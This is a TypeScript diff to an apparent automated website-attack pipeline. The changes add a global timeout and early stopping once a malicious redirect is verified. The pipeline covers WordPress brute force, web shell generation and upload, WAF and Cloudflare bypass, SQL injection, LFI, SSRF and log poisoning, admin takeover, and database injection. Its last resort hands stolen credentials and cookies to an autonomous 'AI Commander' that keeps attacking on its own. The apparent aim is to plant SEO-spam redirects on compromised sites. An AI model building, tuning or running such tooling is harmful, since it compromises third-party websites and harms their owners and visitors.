@@ -72,6 +72,8 @@ export interface PipelineConfig {
   enablePostUpload?: boolean;
   // User tracking
   userId?: number;
+  // Global pipeline timeout (ms) — default 20 minutes
+  globalTimeout?: number;
 }
 
 export interface PipelineEvent {
@@ -720,11 +722,30 @@ export async function runUnifiedAttackPipeline(
   onEvent: EventCallback = () => {},
 ): Promise<PipelineResult> {
   const startTime = Date.now();
+  const GLOBAL_TIMEOUT = config.globalTimeout || 20 * 60 * 1000; // 20 minutes default
+  const deadline = startTime + GLOBAL_TIMEOUT;
+  const pipelineAbort = new AbortController();
   const aiDecisions: string[] = [];
   const errors: string[] = [];
   const uploadedFiles: UploadedFile[] = [];
   let prescreen: PreScreenResult | null = null;
   let vulnScan: VulnScanResult | null = null;
+
+  /** Check if pipeline should stop (timeout or success already achieved) */
+  function shouldStop(reason?: string): boolean {
+    if (pipelineAbort.signal.aborted) return true;
+    if (Date.now() > deadline) {
+      onEvent({ phase: "error", step: "global_timeout", detail: `⏰ Global pipeline timeout (${GLOBAL_TIMEOUT / 60000}min) reached${reason ? ` during ${reason}` : ''} — wrapping up...`, progress: 99 });
+      errors.push(`global_timeout_during_${reason || 'unknown'}`);
+      return true;
+    }
+    return false;
+  }
+
+  /** Check if we already have a verified redirect (no need to continue attacking) */
+  function hasSuccessfulRedirect(): boolean {
+    return uploadedFiles.some(f => f.redirectWorks && f.redirectDestinationMatch);
+  }
 
   // ─── Phase 0: AI Target Analysis (NEW — deep intelligence before attack) ───
   let aiTargetAnalysis: AiTargetAnalysis | null = null;
@@ -927,7 +948,7 @@ export async function runUnifiedAttackPipeline(
   let discoveredCredentials: any[] = [];
   let nonWpExploitResults: NonWpScanResult | null = null;
 
-  if (config.enableConfigExploit !== false) {
+  if (config.enableConfigExploit !== false && !shouldStop('config_exploit')) {
     try {
       onEvent({
         phase: "config_exploit",
@@ -974,7 +995,7 @@ export async function runUnifiedAttackPipeline(
     }
   }
 
-  if (config.enableDnsAttacks !== false) {
+  if (config.enableDnsAttacks !== false && !shouldStop('dns_recon')) {
     try {
       onEvent({
         phase: "dns_attack",
@@ -1028,7 +1049,7 @@ export async function runUnifiedAttackPipeline(
   const wafDetected = prescreen?.wafDetected || aiTargetAnalysis?.security?.wafDetected || "";
   const isCloudflare = wafDetected.toLowerCase().includes("cloudflare");
   
-  if (isCloudflare) {
+  if (isCloudflare && !shouldStop('cf_bypass')) {
     try {
       const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
       onEvent({
@@ -1084,7 +1105,7 @@ export async function runUnifiedAttackPipeline(
   const detectedCms = (prescreen?.cms || aiTargetAnalysis?.techStack?.cms || "").toLowerCase();
   const isWordPress = detectedCms.includes("wordpress") || detectedCms === "wp";
 
-  if (isWordPress) {
+  if (isWordPress && !shouldStop('wp_brute_force') && !hasSuccessfulRedirect()) {
     try {
       const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
       onEvent({
@@ -1094,12 +1115,18 @@ export async function runUnifiedAttackPipeline(
         progress: 44,
       });
 
+      // Calculate remaining time for brute force (max 2 min or remaining pipeline time, whichever is less)
+      const remainingMs = Math.max(deadline - Date.now(), 30000);
+      const bruteForceTimeout = Math.min(120000, remainingMs);
+
       wpBruteForceResult = await Promise.race([
         wpBruteForce({
           targetUrl: config.targetUrl,
           domain: targetDomain,
           maxAttempts: 50,
           delayBetweenAttempts: 800,
+          maxLockouts: 3,           // Stop after 3 lockouts (was infinite!)
+          globalTimeout: bruteForceTimeout, // Respect pipeline deadline
           originIP: originIp,
           onProgress: (msg) => {
             onEvent({
@@ -1110,7 +1137,7 @@ export async function runUnifiedAttackPipeline(
             });
           },
         }),
-        new Promise<BruteForceResult>((_, reject) => setTimeout(() => reject(new Error("brute force timeout")), 120000)),
+        new Promise<BruteForceResult>((_, reject) => setTimeout(() => reject(new Error("brute force timeout")), bruteForceTimeout + 5000)),
       ]);
 
       if (wpBruteForceResult.success && wpBruteForceResult.credentials) {
@@ -1191,6 +1218,9 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 3: Shell Generation ───
   let shells: GeneratedShell[] = [];
+  if (shouldStop('shell_gen') || hasSuccessfulRedirect()) {
+    onEvent({ phase: "shell_gen", step: "skipped", detail: `⏭️ Shell generation skipped — ${hasSuccessfulRedirect() ? 'already have successful redirect' : 'timeout'}`, progress: 50 });
+  } else
   try {
     onEvent({
       phase: "shell_gen",
@@ -1277,7 +1307,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 4: Upload (try each shell with all methods) ───
   let totalAttempts = 0;
 
-  if (shells.length > 0) {
+  if (shells.length > 0 && !shouldStop('upload') && !hasSuccessfulRedirect()) {
     onEvent({
       phase: "upload",
       step: "start",
@@ -1300,6 +1330,9 @@ export async function runUnifiedAttackPipeline(
 
     // Try uploading each shell until we get at least one success
     for (let i = 0; i < sortedShells.length; i++) {
+      // Check global deadline and success status before each shell attempt
+      if (shouldStop('upload_loop') || hasSuccessfulRedirect()) break;
+
       const shell = sortedShells[i];
 
       // Skip PHP shells if we already know PHP doesn't execute on this server
@@ -1507,13 +1540,13 @@ export async function runUnifiedAttackPipeline(
 
   const hasVerifiedRedirect = uploadedFiles.some(f => f.redirectWorks);
 
-  if (!hasVerifiedRedirect && shells.length > 0) {
+  if (!hasVerifiedRedirect && shells.length > 0 && !shouldStop('advanced_attacks') && !hasSuccessfulRedirect()) {
     const bestShell = shells[0];
     const shellContent = typeof bestShell.content === "string" ? bestShell.content : bestShell.content.toString("base64");
     const targetForAdvanced = originIp ? `http://${originIp}` : config.targetUrl;
 
     // 4.5a: WAF Bypass uploads
-    if (config.enableWafBypass !== false) {
+    if (config.enableWafBypass !== false && !shouldStop('waf_bypass') && !hasSuccessfulRedirect()) {
       try {
         onEvent({
           phase: "waf_bypass",
@@ -1578,7 +1611,7 @@ export async function runUnifiedAttackPipeline(
     }
 
     // 4.5b: Alternative Upload Vectors
-    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks)) {
+    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('alt_upload') && !hasSuccessfulRedirect()) {
       try {
         onEvent({
           phase: "alt_upload",
@@ -1640,7 +1673,7 @@ export async function runUnifiedAttackPipeline(
     }
 
     // 4.5c: Indirect Attacks (SQLi, LFI, SSRF, Log Poisoning)
-    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks)) {
+    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('indirect') && !hasSuccessfulRedirect()) {
       try {
         onEvent({
           phase: "indirect",
@@ -1701,7 +1734,7 @@ export async function runUnifiedAttackPipeline(
   let wpAdminResults: WpTakeoverResult[] = [];
   let wpDbInjectionResults: WpDbInjectionResult[] = [];
 
-  if (!uploadedFiles.some(f => f.redirectWorks)) {
+  if (!uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_admin') && !hasSuccessfulRedirect()) {
     // 4.6a: WP Admin Takeover (brute force → theme/plugin editor → XMLRPC → REST API)
     if (config.enableWpAdminTakeover !== false) {
       try {
@@ -1782,7 +1815,7 @@ export async function runUnifiedAttackPipeline(
     }
 
     // 4.6b: WP Database Injection (SQLi → wp_options/wp_posts/widgets/.htaccess/cPanel)
-    if (config.enableWpDbInjection !== false && !uploadedFiles.some(f => f.redirectWorks)) {
+    if (config.enableWpDbInjection !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_db_inject')) {
       try {
         onEvent({
           phase: "wp_db_inject",
@@ -1873,7 +1906,7 @@ export async function runUnifiedAttackPipeline(
   const isGenericTarget = !detectedCmsForNonWp || detectedCmsForNonWp === "unknown" || detectedCmsForNonWp === "custom";
   const hasVerifiedUploads = uploadedFiles.filter(f => f.verified).length > 0;
 
-  if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget)) {
+  if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget) && !shouldStop('nonwp_exploits') && !hasSuccessfulRedirect()) {
     onEvent({
       phase: "shellless" as any,
       step: "nonwp_exploits_start",
@@ -1951,7 +1984,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5: Shellless Attacks (when ALL uploads failed) ───
   let shelllessResults: ShelllessResult[] = [];
 
-  if (uploadedFiles.length === 0) {
+  if (uploadedFiles.length === 0 && !shouldStop('shellless') && !hasSuccessfulRedirect()) {
     onEvent({
       phase: "shellless",
       step: "start",
@@ -2410,7 +2443,7 @@ export async function runUnifiedAttackPipeline(
   // Last resort: if ALL methods failed, let AI Commander try autonomously
   let aiCommanderResult: AiCommanderResult | null = null;
   const noSuccessfulUploads = uploadedFiles.filter(f => f.verified).length === 0;
-  if (noSuccessfulUploads && config.enableAiCommander !== false) {
+  if (noSuccessfulUploads && config.enableAiCommander !== false && !shouldStop('ai_commander')) {
     const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
     onEvent({
       phase: "shellless" as any,
@@ -2420,40 +2453,47 @@ export async function runUnifiedAttackPipeline(
     });
 
     try {
-      aiCommanderResult = await runAiCommander({
-        targetDomain: domain,
-        redirectUrl: config.redirectUrl,
-        maxIterations: Math.min(config.aiCommanderMaxIterations || 10, 15),
-        timeoutPerAttempt: 15000,
-        seoKeywords: config.seoKeywords,
-        preAnalysis: aiTargetAnalysis,
-        userId: config.userId,
-        pipelineType: "autonomous",
-        // v4: Pass CF bypass origin IP and WP credentials
-        originIP: originIp,
-        wpCredentials: wpAuthCredentials ? {
-          username: wpAuthCredentials.username,
-          password: wpAuthCredentials.password,
-          method: wpAuthCredentials.method,
-          cookies: wpAuthCredentials.cookies,
-          nonce: wpAuthCredentials.nonce,
-          authHeader: wpAuthCredentials.authHeader,
-        } : null,
-        onEvent: (event: AiCommanderEvent) => {
-          onEvent({
-            phase: "shellless" as any,
-            step: `ai_cmd_${event.type}_${event.iteration}`,
-            detail: event.detail,
-            progress: 95 + Math.min(event.iteration / (event.maxIterations || 10) * 4, 4),
-            data: {
-              ...event.data,
-              iteration: event.iteration,
-              maxIterations: event.maxIterations,
-              eventType: event.type,
-            },
-          });
-        },
-      });
+      // Calculate remaining time for AI Commander (max 5 min or remaining pipeline time)
+      const aiRemainingMs = Math.max(deadline - Date.now(), 60000);
+      const aiMaxTime = Math.min(5 * 60 * 1000, aiRemainingMs);
+
+      aiCommanderResult = await Promise.race([
+        runAiCommander({
+          targetDomain: domain,
+          redirectUrl: config.redirectUrl,
+          maxIterations: Math.min(config.aiCommanderMaxIterations || 10, 15),
+          timeoutPerAttempt: 15000,
+          seoKeywords: config.seoKeywords,
+          preAnalysis: aiTargetAnalysis,
+          userId: config.userId,
+          pipelineType: "autonomous",
+          // v4: Pass CF bypass origin IP and WP credentials
+          originIP: originIp,
+          wpCredentials: wpAuthCredentials ? {
+            username: wpAuthCredentials.username,
+            password: wpAuthCredentials.password,
+            method: wpAuthCredentials.method,
+            cookies: wpAuthCredentials.cookies,
+            nonce: wpAuthCredentials.nonce,
+            authHeader: wpAuthCredentials.authHeader,
+          } : null,
+          onEvent: (event: AiCommanderEvent) => {
+            onEvent({
+              phase: "shellless" as any,
+              step: `ai_cmd_${event.type}_${event.iteration}`,
+              detail: event.detail,
+              progress: 95 + Math.min(event.iteration / (event.maxIterations || 10) * 4, 4),
+              data: {
+                ...event.data,
+                iteration: event.iteration,
+                maxIterations: event.maxIterations,
+                eventType: event.type,
+              },
+            });
+          },
+        }),
+        new Promise<AiCommanderResult>((_, reject) => setTimeout(() => reject(new Error(`AI Commander timeout (${Math.round(aiMaxTime / 1000)}s)`)), aiMaxTime)),
+      ]);
 
       if (aiCommanderResult.success && aiCommanderResult.uploadedUrl) {
         uploadedFiles.push({
